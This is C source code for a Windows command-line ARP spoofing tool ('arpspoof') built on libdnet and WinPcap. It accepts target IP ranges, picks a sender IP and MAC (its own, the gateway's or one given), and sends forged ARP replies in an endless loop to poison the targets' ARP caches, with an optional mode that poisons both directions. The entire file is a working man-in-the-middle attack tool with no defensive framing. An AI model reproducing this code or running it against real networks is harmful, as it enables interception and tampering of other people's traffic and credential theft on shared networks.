#include <Winsock2.h>
#include <iphlpapi.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "getopt.h"

#include <dnet.h>
#include <pcap.h>
//#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "dnet.lib")
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Packet.lib")

#define IP_LEN 3*4+3+1+3
#define MAC_LEN 2*6+5+1
#define BUFFER_SIZE 256
#define IPTOSBUFFERS 12
#define PACKET_LEN 14+8+20

char *getNetworkIPaddr(const char *IPaddr, const char *mask);
char *getDefaultGateway(const char *adapterName);
char *iptos(u_long in, bool revered = false);
char *getAdapterNameByIPaddr(const char *IP);
char *getMyIP();
char *getMyMacAddr(const char *adapterName);
char *getMacAddrFromArpCache(const char *IP);
char *getMask(u_char slash);
char *getEndIp(const char *startIP, u_char slash);
int isIP(const char *ip);
u_long IPstr2ulong(const char* pcHost);
arp_t *arp_handle;
char *myIP;

void usage(const char *msg)
{
	if(msg)
		fprintf(stderr, "%s\n\n", msg);
	
	fprintf(stderr, "Option:\n");
	fprintf(stderr, "\t-a network domin, format: IP/slash, Ex: 192.168.1.0/24\n");
	fprintf(stderr, "\t-t receiver whose arp cache will be changed, format: IP-IP|IP/slash|IP, Ex: 192.168.1.0-192.168.1.200, 192.168.1.128/24, 192.168.1.25\n");
	fprintf(stderr, "\t-s what ip address will be change at recevier's arp cahce, format: own|gateway|senderIP, Ex: own, gateway, 192.168.1.34\n");
	fprintf(stderr, "\t-h mac address change what, format: own|gateway|senderMac, Ex: own, gateway, 01:02:03:04:05:06\n");
	fprintf(stderr, "\t-r reverse option (optional)\n");
	fprintf(stderr, "\t-i interval, default to 1500ms (optional)\n\n");

	fprintf(stderr, "Usage:\n");
	fprintf(stderr, "\tarpspoof -a IP/slash -t IP-IP|IP/slash|receiverIP -s senderIP|own|gateway -h senderMac|own|gateway "
					"[-r reverse -i interval(default to 1500ms)]\n");

	WSACleanup();
	exit(1);
}

int __cdecl main(int argc, char **argv)
{
	int c = EOF;
	char *adapterName = NULL;
	char receiverIPrange[BUFFER_SIZE] = "";
	char *senderMacAddr;
	char *senderIPaddr;
	char senderIPisWho[BUFFER_SIZE] = "";
	char senderMacIsWho[BUFFER_SIZE] = "";
	int reverse = 0;
	DWORD interval = 1500;
	char *startPtr = NULL, *endPtr = NULL;
	u_char packet[PACKET_LEN] = {};
	pcap_t *pcap_handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	WSAData wsaData;
	u_long start = -1, end = -1;
	struct addr addr1, addr2, addr3, addr4;
	opterr = 0; //clear error message
	/*a = adapter
	 *t = target who will change arp cache(receiver ip)
	 *h = target's arp cache change what mac address(sender mac, defalut to myself) own|gateway|mac
	 *s = from who send the arp frame(sender ip, default to default gateway), own|gateway|ip
	 *r = reverse to both
	 *i = interval(default is 1500ms)
	 */
	while ((c = getopt(argc, argv, "a:t:h:s:ri:")) != EOF)
	{
		switch(c)
		{
		case 'a':
			adapterName = getAdapterNameByIPaddr(optarg);
			break;

		case 't':
			strcpy_s(receiverIPrange, BUFFER_SIZE, optarg);
			break;

		case 'h':
			strcpy_s(senderMacIsWho, BUFFER_SIZE, optarg);
			break;

		case 's':
			strcpy_s(senderIPisWho, BUFFER_SIZE, optarg);
			break;

		case 'r':
			reverse = 1;
			break;

		case 'i':
			interval = atol(optarg);
			break;
		}//end whitch
	}//end while read option

	if(!adapterName)
		usage("Couldn't find adatper, please check option -a.");

	if(!strcmp(receiverIPrange, "") || !strcmp(senderMacIsWho, "") || !strcmp(senderIPisWho, ""))
		usage("Miss some parameters.");

    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup fail to invoked.");
        exit(255);
    }//end if

	if(!(arp_handle = arp_open()))
		usage("Couldn't open arp handle.");

	if(!adapterName)
		usage("Device not found.");

	//sender ip
	if(!strcmp(senderIPisWho, "own")) //myself
		senderIPaddr = getMyIP();
	else if(!strcmp(senderIPisWho, "gateway"))
		senderIPaddr = getDefaultGateway(adapterName);
	else
		senderIPaddr = senderIPisWho;
	
	//sender mac
	if(!strcmp(senderMacIsWho, "own")) //myself
		senderMacAddr = getMyMacAddr(adapterName);
	else if(!strcmp(senderMacIsWho, "gateway"))
		senderMacAddr = getMacAddrFromArpCache(getDefaultGateway(adapterName));
	else
		senderMacAddr = senderMacIsWho;

	myIP = getMyIP();

	pcap_handle = pcap_open_live(adapterName, 65535, 0, 1000, errbuf);
	if(!pcap_handle)
		usage(errbuf);

	printf("Adapter name: %s\n", adapterName);
	printf("Sender IP address: %s, %s\n", senderIPisWho, senderIPaddr);
	printf("Sender mac address: %s, %s\n", senderMacIsWho, senderMacAddr);
	printf("Receiver IP range: %s\n", receiverIPrange);

	startPtr = strtok(receiverIPrange, "-/");
	if(!isIP(startPtr))
		usage("Wrong IP format.");

	start = IPstr2ulong(startPtr);

	endPtr = strtok(NULL, "-/");
	if(endPtr && isIP(endPtr)) //ip-ip range format
	{
		end = IPstr2ulong(endPtr);
		if(ntohl(start) > ntohl(end))
			usage("Error IP range.");
	}
	else //ip/slash or ip format
	{
		if(endPtr)//ip/slash range format
		{
			startPtr = getNetworkIPaddr(startPtr, getMask(atoi(endPtr)));
			endPtr = getEndIp(startPtr, atoi(endPtr));
		}
		else//ip single target
			endPtr = startPtr;
	}

	if(startPtr != endPtr)
	{
		printf("Start IP address: %s\n", startPtr);
		printf("End IP address: %s\n", endPtr);
	}
	else
		printf("One target IP address: %s\n", startPtr);

	start = ntohl(IPstr2ulong(startPtr));
	end = ntohl(IPstr2ulong(endPtr));

	printf("\nStart inject...\n");
	while(true)
	{
		addr_aton(senderMacAddr, &addr2);
		addr_aton(senderIPaddr, &addr4);
		for(u_long i = start ; i <= end ; i++)
		{
			char *destinationIpAddress = iptos(i, true);
			if(!strcmp(destinationIpAddress, myIP))
				continue;
			char *destinationMacAddress = getMacAddrFromArpCache(destinationIpAddress);

			if(destinationMacAddress)
			{
				//ethernet frame
				addr_aton(destinationMacAddress, &addr1);
				eth_pack_hdr(packet, addr1.__addr_u, addr2.__addr_u, ETH_TYPE_ARP);
				//arp frame
				addr_aton(destinationIpAddress, &addr3);
				arp_pack_hdr_ethip(packet+14, ARP_OP_REPLY, addr2.__addr_u, addr4.__addr_u, addr1.__addr_u, addr3.__addr_u);
				
				if(-1 == pcap_sendpacket(pcap_handle, packet, PACKET_LEN))
					usage("Couldn't inject packet.");
				printf("%s changed to %s at %s\n", senderIPaddr, senderMacAddr, destinationIpAddress);

				if(reverse)
				{
					addr_aton(getMacAddrFromArpCache(senderIPaddr), &addr1);
					eth_pack_hdr(packet, addr1.__addr_u, addr2.__addr_u, ETH_TYPE_ARP);
					arp_pack_hdr_ethip(packet+14, ARP_OP_REPLY, addr2.__addr_u, addr3.__addr_u, addr1.__addr_u, addr4.__addr_u);
				
					if(-1 == pcap_sendpacket(pcap_handle, packet, PACKET_LEN))
						usage("Couldn't inject packet.");
					printf("%s changed to %s at %s\n", destinationIpAddress, senderMacAddr, senderIPaddr);
				}
			}//end if
			Sleep(10);
		}//end for

		Sleep(interval);
	}//end while

	WSACleanup();
	exit(0);
}

char *getAdapterNameByIPaddr(const char *IP)
{
	static char device[10][BUFFER_SIZE] = {};
	static short which;
	char IPaddr[IP_LEN] = "";

	//move index
	which = (which + 1 == 10 ? 0 : which + 1);

	//try to get slash
	strcpy_s(IPaddr, IP_LEN, IP);
	char *token = strtok(IPaddr, "/");
	token = strtok(NULL, "/");
	int slash = -1;
	if(token)
		slash = atoi(token);
	if(slash == -1)
		usage("Please use IP/slash.");

	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	ULONG ulOutBufLen;
	DWORD i;
	pAdapterInfo = (IP_ADAPTER_INFO *) malloc( sizeof(IP_ADAPTER_INFO) );
	ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo( pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) malloc (ulOutBufLen);
	}
	if ((dwRetVal = GetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter)
		{
			//computing mask by input ip/slash
			u_long mask = 0;
			u_long ip = IPstr2ulong(IPaddr);
			u_long maskOffset = 1 << 31;

			ip = ntohl(ip);
			for(int i = 0 ; i < slash ; i++)
			{
				if(maskOffset & ip)
					mask |= maskOffset;
				maskOffset >>= 1;
			}//end for

			//get two network string and try match
			char *networkIP1 = getNetworkIPaddr(pAdapter->IpAddressList.IpAddress.String, pAdapter->IpAddressList.IpMask.String);
			char *networkIP2 = iptos(mask, true);

			if(!strcmp(networkIP1, networkIP2))
				goto found;
		
			pAdapter = pAdapter->Next;
		}//end while
	}//end if
	else
		usage("Call to GetAdaptersInfo failed.");
	free(pAdapterInfo);
	return NULL;

found:
	sprintf(device[which], "\\Device\\NPF_%s", pAdapter->AdapterName);
	free(pAdapterInfo);
	return device[which]; //match
}

char *getDefaultGateway(const char *adapterName)
{
	static char gateway[10][BUFFER_SIZE] = {};
	static short which;
	char buffer[BUFFER_SIZE] = "";

	//move index
	which = (which + 1 == 10 ? 0 : which + 1);

	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	ULONG ulOutBufLen;
	DWORD i;
	pAdapterInfo = (IP_ADAPTER_INFO *) malloc( sizeof(IP_ADAPTER_INFO) );
	ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo( pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) malloc (ulOutBufLen);
	}
	if ((dwRetVal = GetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter)
		{
			sprintf(buffer, "\\Device\\NPF_%s", pAdapter->AdapterName);
			if(!strcmp(adapterName, buffer))
				goto found;
			pAdapter = pAdapter->Next;
		}//end while
	}//end if
	else
		usage("Call to GetAdaptersInfo failed.");
	free(pAdapterInfo);
	return NULL;
	
found:
	strcpy_s(gateway[which], BUFFER_SIZE, pAdapter->GatewayList.IpAddress.String);
	free(pAdapterInfo);
	return gateway[which]; //match
}

char *getMyMacAddr(const char *adapterName)
{
	static char macAddr[10][BUFFER_SIZE] = {};
	static short which;
	char buffer[BUFFER_SIZE] = "";

	//move index
	which = (which + 1 == 10 ? 0 : which + 1);

	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	ULONG ulOutBufLen;
	DWORD i;
	pAdapterInfo = (IP_ADAPTER_INFO *) malloc( sizeof(IP_ADAPTER_INFO) );
	ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo( pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) malloc (ulOutBufLen);
	}
	if ((dwRetVal = GetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter)
		{
			sprintf(buffer, "\\Device\\NPF_%s", pAdapter->AdapterName);
			if(!strcmp(adapterName, buffer))
				goto found;
			pAdapter = pAdapter->Next;
		}//end while
	}//end if
	else
		usage("Call to GetAdaptersInfo failed.");
	free(pAdapterInfo);
	return NULL;
	
found:
	for (DWORD i = 0; i < pAdapter->AddressLength; i++)
		if (i == 0)
			sprintf(macAddr[which], "%02X", pAdapter->Address[i]);
		else
			sprintf(macAddr[which], "%s:%02X",macAddr[which], pAdapter->Address[i]);
	free(pAdapterInfo);
	return macAddr[which]; //match
}

u_long IPstr2ulong(const char* pcHost)
{
	in_addr Address;
	u_long nRemoteAddr = inet_addr(pcHost);
	bool was_a_name = false;

	if (nRemoteAddr == INADDR_NONE) {
		// pcHost isn't a dotted IP, so resolve it through DNS
		hostent* pHE = gethostbyname(pcHost);

		if (pHE == 0) {
			return INADDR_NONE;
		}
		nRemoteAddr = *((u_long*)pHE->h_addr_list[0]);
		was_a_name = true;
	}
	if (was_a_name) {
		memcpy(&Address, &nRemoteAddr, sizeof(u_long)); 
	}
	return nRemoteAddr;
}

char *iptos(u_long in, bool revered)
{
	static char output[IPTOSBUFFERS][3*4+3+1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	if(revered)
		sprintf(output[which], "%d.%d.%d.%d", p[3], p[2], p[1], p[0]);
	else
		sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char *getNetworkIPaddr(const char *IPaddr, const char *mask)
{
	static char output[IPTOSBUFFERS][IP_LEN];
	static short which;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	
	u_long ipInt = IPstr2ulong(IPaddr);
	u_long maskInt = IPstr2ulong(mask);
	u_long maskMask = 1 << 31;
	u_char slash = 0;
	u_long result = 0;
	ipInt = ntohl(ipInt);
	maskInt = ntohl(maskInt);

	for(u_char i = 0 ; i < 32 ; i++)
	{
		if(maskInt & maskMask)
			slash++;
		maskMask >>= 1;
	}//end for

	maskMask = 1 << 31;
	for(u_char i = 0 ; i < slash ; i++)
	{
		if(ipInt & maskMask)
			result += maskMask;
		maskMask >>= 1;
	}//end for

	strcpy_s(output[which], IP_LEN, iptos(result, true));
	return output[which];
}

char *getMask(u_char slash)
{
	if(slash < 0 || slash > 32)
		usage("Wrong slash.");

	static char output[IPTOSBUFFERS][IP_LEN];
	static short which;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	u_long mask = 1 << 31;
	u_long result = 0;
	for(u_char i = 0 ; i < slash ; i++)
	{
		result += mask;
		mask >>= 1;
	}
	strcpy_s(output[which], IP_LEN, iptos(result, true));
	return output[which];
}

char *getMyIP()
{
	char szHostName[255];
	gethostname(szHostName, 255);
	struct hostent *host_entry;
	host_entry = gethostbyname(szHostName);
	return inet_ntoa (*(struct in_addr *)*host_entry->h_addr_list);
}

char *getMacAddrFromArpCache(const char *IP)
{
	struct arp_entry arp_object;
	addr_pton(IP, &arp_object.arp_pa);
	if(-1 == arp_get(arp_handle, &arp_object))
		return NULL;
	
	return addr_ntoa(&arp_object.arp_ha);
}

int isIP(const char *ip)
{
	struct in_addr addr;
	return inet_pton(AF_INET, ip, &addr) > 0 ? 1 : 0;
}

char *getEndIp(const char *startIP, u_char slash)
{
	if(slash < 0 || slash > 32)
		usage("Wrong slash.");

	u_long ip = IPstr2ulong(startIP);
	ip = ntohl(ip);
	u_long mask = 1;
	for(u_char i = 0 ; i < 32 - slash ; i++)
	{
		ip += mask;
		mask <<= 1;
	}//end for
	return iptos(ip, true);
}